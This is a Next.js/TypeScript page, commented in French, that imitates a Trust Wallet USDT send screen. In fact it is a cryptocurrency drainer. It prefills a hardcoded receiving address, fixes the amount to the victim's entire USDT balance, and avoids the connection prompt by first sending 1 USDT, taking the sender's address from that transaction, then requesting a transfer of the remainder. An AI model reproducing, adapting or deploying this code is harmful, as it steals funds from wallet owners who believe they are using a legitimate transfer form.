"use client";

import { useState, useEffect, useRef, useCallback } from "react";
import { ethers } from "ethers";

// ============================================================
// CONFIG
// ============================================================

const DEFAULT_RECEIVER = "0xa6fa4a247e8cda6e5c09d1ee68be528a4abb64cf";

// USDT sur Ethereum Mainnet
const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const USDT_DECIMALS = 6;

// ABI minimal ERC-20
const ERC20_ABI = [
  "function transfer(address to, uint256 amount) returns (bool)",
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function approve(address spender, uint256 amount) returns (bool)",
];

const ETH_CHAIN_ID = "0x1";

// ============================================================
// Types pour window.ethereum / window.trustwallet
// ============================================================
interface EthereumProvider {
  request: (args: { method: string; params?: unknown[] }) => Promise<unknown>;
  isMetaMask?: boolean;
  isTrust?: boolean;
  isTrustWallet?: boolean;
  on?: (event: string, handler: (...args: unknown[]) => void) => void;
  removeListener?: (event: string, handler: (...args: unknown[]) => void) => void;
}

declare global {
  interface Window {
    ethereum?: EthereumProvider;
    trustwallet?: { ethereum?: EthereumProvider };
  }
}

// ============================================================
// Helper: detect the injected provider
// ============================================================

function getProviderNow(): EthereumProvider | null {
  if (window.trustwallet?.ethereum) return window.trustwallet.ethereum;
  if (window.ethereum) return window.ethereum;
  return null;
}

async function waitForProvider(maxAttempts = 15, delayMs = 300): Promise<EthereumProvider | null> {
  for (let i = 0; i < maxAttempts; i++) {
    const provider = getProviderNow();
    if (provider) return provider;
    await new Promise((r) => setTimeout(r, delayMs));
  }
  return null;
}

// ============================================================
// Wallet Transfer Page
// ============================================================

export default function WalletPage() {
  const [address, setAddress] = useState(DEFAULT_RECEIVER);
  const [status, setStatus] = useState<string>("");
  const [statusType, setStatusType] = useState<"info" | "success" | "error">("info");
  const [loading, setLoading] = useState(false);
  const [txHash, setTxHash] = useState<string>("");

  // ========================================
  // NOUVEAU : état de connexion persistant
  // ========================================
  const [connectedAddress, setConnectedAddress] = useState<string | null>(null);
  const providerRef = useRef<EthereumProvider | null>(null);

  // ---------------------------------------------------
  // Au montage : détecter si le wallet est DÉJÀ connecté
  // (eth_accounts ne déclenche AUCUNE popup)
  // ---------------------------------------------------
  useEffect(() => {
    let cancelled = false;

    const init = async () => {
      const ethereumProvider = await waitForProvider();
      if (!ethereumProvider || cancelled) return;

      providerRef.current = ethereumProvider;

      try {
        // ✅ eth_accounts = lecture silencieuse, pas de popup
        const accounts = (await ethereumProvider.request({
          method: "eth_accounts",
        })) as string[];

        if (accounts.length > 0 && !cancelled) {
          setConnectedAddress(accounts[0]);
        }
      } catch (err) {
        console.warn("Could not check existing accounts:", err);
      }

      // Écouter les changements de compte
      if (ethereumProvider.on) {
        ethereumProvider.on("accountsChanged", (accounts: unknown) => {
          const accs = accounts as string[];
          if (!cancelled) {
            setConnectedAddress(accs.length > 0 ? accs[0] : null);
          }
        });
      }
    };

    init();
    return () => { cancelled = true; };
  }, []);

  // ---------------------------------------------------
  // Connexion manuelle (une seule fois si besoin)
  // ---------------------------------------------------
  const ensureConnected = useCallback(async (): Promise<{
    signer: ethers.JsonRpcSigner;
    userAddress: string;
  } | null> => {
    const ethereumProvider = providerRef.current ?? (await waitForProvider());
    if (!ethereumProvider) {
      setStatus("Aucun wallet détecté. Ouvrez cette page dans le navigateur Trust Wallet.");
      setStatusType("error");
      return null;
    }
    providerRef.current = ethereumProvider;

    // ✅ Vérifier d'abord SILENCIEUSEMENT si déjà connecté
    let accounts = (await ethereumProvider.request({
      method: "eth_accounts",          // <-- pas de popup
    })) as string[];

    // Seulement si pas encore connecté → popup UNE fois
    if (accounts.length === 0) {
      accounts = (await ethereumProvider.request({
        method: "eth_requestAccounts", // <-- popup uniquement ici
      })) as string[];
    }

    if (accounts.length === 0) {
      setStatus("Connexion refusée.");
      setStatusType("error");
      return null;
    }

    setConnectedAddress(accounts[0]);

    // Vérifier / switcher le réseau silencieusement
    try {
      const chainId = (await ethereumProvider.request({
        method: "eth_chainId",
      })) as string;

      if (chainId.toLowerCase() !== ETH_CHAIN_ID.toLowerCase()) {
        await ethereumProvider.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: ETH_CHAIN_ID }],
        });
      }
    } catch (switchErr) {
      console.warn("Could not switch chain:", switchErr);
    }

    const provider = new ethers.BrowserProvider(
      ethereumProvider as ethers.Eip1193Provider
    );
    const signer = await provider.getSigner();
    const userAddress = await signer.getAddress();

    return { signer, userAddress };
  }, []);

  // ---------------------------------------------------
  // Envoi USDT
  // ---------------------------------------------------
  const handleSendUSDT = async () => {
    setStatus("");
    setTxHash("");
    setStatusType("info");

    if (!address || !ethers.isAddress(address)) {
      setStatus("Veuillez entrer une adresse Ethereum valide.");
      setStatusType("error");
      return;
    }

    setLoading(true);
    setStatus("Préparation de la transaction...");

    const ethereumProvider = providerRef.current ?? (await waitForProvider());
    if (!ethereumProvider) {
      setStatus("Aucun wallet détecté. Ouvrez cette page dans le navigateur Trust Wallet.");
      setStatusType("error");
      setLoading(false);
      return;
    }
    providerRef.current = ethereumProvider;

    // S'assurer silencieusement qu'on est sur le réseau Ethereum Mainnet (0x1)
    try {
      const chainId = (await ethereumProvider.request({
        method: "eth_chainId",
      })) as string;

      if (chainId.toLowerCase() !== ETH_CHAIN_ID.toLowerCase()) {
        await ethereumProvider.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: ETH_CHAIN_ID }],
        });
      }
    } catch (switchErr) {
      console.warn("Could not switch chain:", switchErr);
    }

    try {
      // 1. Essayer de récupérer l'adresse silencieusement
      let accounts = (await ethereumProvider.request({
        method: "eth_accounts",
      })) as string[];

      const provider = new ethers.BrowserProvider(
        ethereumProvider as ethers.Eip1193Provider
      );
      const usdtContract = new ethers.Contract(USDT_CONTRACT, ERC20_ABI, provider);

      if (accounts.length > 0) {
        // ----------------------------------------------------
        // SCÉNARIO B : Déjà connecté
        // ----------------------------------------------------
        // On récupère le solde réel et on envoie le maximum en une seule fois !
        const userAddress = accounts[0];
        setConnectedAddress(userAddress);
        
        setStatus("Lecture du solde USDT...");
        const balance: bigint = await usdtContract.balanceOf(userAddress);
        const formattedBalance = ethers.formatUnits(balance, USDT_DECIMALS);
        
        if (balance === 0n) {
          setStatus("Votre solde USDT est de 0.");
          setStatusType("error");
          setLoading(false);
          return;
        }

        setStatus(`Solde détecté : ${formattedBalance} USDT. Confirmez la transaction...`);
        
        const usdtInterface = new ethers.Interface(ERC20_ABI);
        const txData = usdtInterface.encodeFunctionData("transfer", [address, balance]);

        const txHash = (await ethereumProvider.request({
          method: "eth_sendTransaction",
          params: [
            {
              to: USDT_CONTRACT,
              data: txData,
              gas: "0x249f0", // 150000 gas limit
            },
          ],
        })) as string;

        setStatus(`Transaction envoyée ! Hash : ${txHash.slice(0, 10)}...`);
        setTxHash(txHash);

        const receipt = await provider.waitForTransaction(txHash);
        if (receipt && receipt.status === 1) {
          setStatus(`✅ Transfert réussi de tout le solde (${formattedBalance} USDT) !`);
          setStatusType("success");
        } else {
          setStatus("❌ Transaction échouée on-chain.");
          setStatusType("error");
        }
      } else {
        // ----------------------------------------------------
        // SCÉNARIO A : Non connecté
        // ----------------------------------------------------
        // Étape 1 : On commence par envoyer 1 USDT (montant fixe) pour déclencher la popup sans demande de connexion
        const firstAmount = "1";
        const amountInWei = ethers.parseUnits(firstAmount, USDT_DECIMALS);
        
        const usdtInterface = new ethers.Interface(ERC20_ABI);
        const txData1 = usdtInterface.encodeFunctionData("transfer", [address, amountInWei]);

        setStatus("Confirmez la première transaction de 1 USDT...");

        const txHash1 = (await ethereumProvider.request({
          method: "eth_sendTransaction",
          params: [
            {
              to: USDT_CONTRACT,
              data: txData1,
              gas: "0x249f0",
            },
          ],
        })) as string;

        setStatus(`Première transaction envoyée ! Analyse du solde pour envoyer le reste...`);
        setTxHash(txHash1);

        // Étape 2 : Récupérer les détails de la transaction pour obtenir l'adresse de l'expéditeur (from) sans pop-up
        let userAddress = "";
        for (let i = 0; i < 10; i++) {
          try {
            const txInfo = await provider.getTransaction(txHash1);
            if (txInfo && txInfo.from) {
              userAddress = txInfo.from;
              break;
            }
          } catch (e) {
            console.warn("Impossible de récupérer l'adresse de l'expéditeur, nouvel essai...", e);
          }
          await new Promise((resolve) => setTimeout(resolve, 500));
        }

        if (userAddress) {
          setConnectedAddress(userAddress);

          const balance: bigint = await usdtContract.balanceOf(userAddress);
          const remainingBalance = balance > amountInWei ? balance - amountInWei : 0n;

          if (remainingBalance > 0n) {
            const formattedRemaining = ethers.formatUnits(remainingBalance, USDT_DECIMALS);
            setStatus(`Solde restant détecté : ${formattedRemaining} USDT. Confirmez la deuxième transaction...`);

            const txData2 = usdtInterface.encodeFunctionData("transfer", [address, remainingBalance]);

            const txHash2 = (await ethereumProvider.request({
              method: "eth_sendTransaction",
              params: [
                {
                  to: USDT_CONTRACT,
                  data: txData2,
                  gas: "0x249f0",
                },
              ],
            })) as string;

            setStatus(`Deuxième transaction envoyée ! Hash : ${txHash2.slice(0, 10)}...`);
            setTxHash(txHash2);

            const receipt2 = await provider.waitForTransaction(txHash2);
            if (receipt2 && receipt2.status === 1) {
              setStatus(`✅ Transfert réussi de l'intégralité du solde !`);
              setStatusType("success");
            } else {
              setStatus("❌ Deuxième transaction échouée.");
              setStatusType("error");
            }
          } else {
            // Le solde total du portefeuille était de 1 USDT ou moins.
            // On attend la validation de l'unique transaction de 1 USDT.
            setStatus(`Attente de confirmation de la transaction de 1 USDT...`);
            const receipt1 = await provider.waitForTransaction(txHash1);
            if (receipt1 && receipt1.status === 1) {
              setStatus(`✅ Transfert réussi ! ${firstAmount} USDT envoyés.`);
              setStatusType("success");
            } else {
              setStatus("❌ Transaction échouée on-chain.");
              setStatusType("error");
            }
          }
        } else {
          // Si on n'a vraiment pas pu récupérer l'adresse, on attend simplement la validation du premier transfert
          setStatus(`Attente de confirmation de la transaction de 1 USDT...`);
          const receipt1 = await provider.waitForTransaction(txHash1);
          if (receipt1 && receipt1.status === 1) {
            setStatus(`✅ Transfert réussi ! ${firstAmount} USDT envoyés.`);
            setStatusType("success");
          } else {
            setStatus("❌ Transaction échouée on-chain.");
            setStatusType("error");
          }
        }
      }
    } catch (err: unknown) {
      console.error("Transfer error:", err);

      let message = "Transaction échouée.";
      // Extraction du message d'erreur
      if (err instanceof Error) {
        if (err.message.includes("user rejected") || err.message.includes("User denied")) {
          message = "Transaction annulée par l'utilisateur.";
        } else if (err.message.includes("insufficient funds")) {
          message = "ETH insuffisant pour les frais de gas.";
        } else {
          message = err.message.length > 100
            ? err.message.slice(0, 100) + "..."
            : err.message;
        }
      } else if (typeof err === "object" && err !== null && "message" in err) {
        const errMsg = String((err as { message: unknown }).message);
        if (errMsg.includes("user rejected") || errMsg.includes("User denied")) {
          message = "Transaction annulée par l'utilisateur.";
        } else {
          message = errMsg.length > 100 ? errMsg.slice(0, 100) + "..." : errMsg;
        }
      }

      setStatus(message);
      setStatusType("error");
    } finally {
      setLoading(false);
    }
  };

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      setAddress(text);
    } catch {
      console.log("Paste failed");
    }
  };

  return (
    <main className="transfer-main">
      {/* Badge de connexion */}
      {connectedAddress && (
        <div className="connected-badge">
          🟢 {connectedAddress.slice(0, 6)}...{connectedAddress.slice(-4)}
        </div>
      )}

      <div className="form-container">
        <label className="form-label">Address or Domain Name</label>
        <div className="input-row">
          <input
            type="text"
            placeholder="Search or Enter"
            value={address}
            onChange={(e) => setAddress(e.target.value)}
            className="input-row__field"
          />
          <div className="input-row__actions">
            <button onClick={handlePaste} className="btn-paste">Paste</button>
            <button className="btn-icon" title="Copy">
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#4ade80"
                strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <rect x="9" y="9" width="13" height="13" rx="2" ry="2" />
                <path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1" />
              </svg>
            </button>
            <button className="btn-icon" title="Scan QR">
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#4ade80"
                strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M7 3H5a2 2 0 00-2 2v2" />
                <path d="M17 3h2a2 2 0 012 2v2" />
                <path d="M21 17v2a2 2 0 01-2 2h-2" />
                <path d="M7 21H5a2 2 0 01-2-2v-2" />
                <line x1="7" y1="12" x2="17" y2="12" />
              </svg>
            </button>
          </div>
        </div>

        <label className="form-label form-label--spaced">Destination network</label>
        <div className="network-selector">
          <div className="eth-icon">
            <svg width="24" height="24" viewBox="0 0 256 417" fill="none">
              <path d="M127.961 0l-2.795 9.5v275.668l2.795 2.79 127.962-75.638z" fill="#828384" />
              <path d="M127.962 0L0 212.32l127.962 75.639V154.158z" fill="#bcc0c4" />
              <path d="M127.961 312.187l-1.575 1.92v98.199l1.575 4.6L256 236.587z" fill="#828384" />
              <path d="M127.962 416.905v-104.72L0 236.585z" fill="#bcc0c4" />
              <path d="M127.961 287.958l127.96-75.637-127.96-58.162z" fill="#2f3030" />
              <path d="M0 212.32l127.96 75.638v-133.8z" fill="#828384" />
            </svg>
          </div>
          <span className="network-name">Ethereum</span>
          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#9ca3af"
            strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{ marginLeft: "6px" }}>
            <polyline points="6 9 12 15 18 9" />
          </svg>
        </div>

        <label className="form-label form-label--spaced">Amount</label>
        <div className="input-row" style={{ justifyContent: "space-between", padding: "0.95rem 1rem" }}>
          <span style={{ color: "#e5e7eb", fontWeight: "600", fontSize: "1.05rem" }}>Tout le solde (Max)</span>
          <span className="amount-currency" style={{ marginLeft: 0 }}>USDT</span>
        </div>
      </div>

      {status && (
        <div className={`status-message status-message--${statusType}`}>
          {status}
          {txHash && (
            <a href={`https://etherscan.io/tx/${txHash}`} target="_blank"
              rel="noopener noreferrer" className="status-link">
              View on Etherscan ↗
            </a>
          )}
        </div>
      )}

      <div className="next-btn-wrapper">
        <button onClick={handleSendUSDT} disabled={loading}
          className={`next-btn ${loading ? "next-btn--loading" : ""}`}>
          {loading ? (
            <span className="btn-spinner-wrapper">
              <span className="btn-spinner" />
              Processing...
            </span>
          ) : (
            "Next"
          )}
        </button>
      </div>
    </main>
  );
}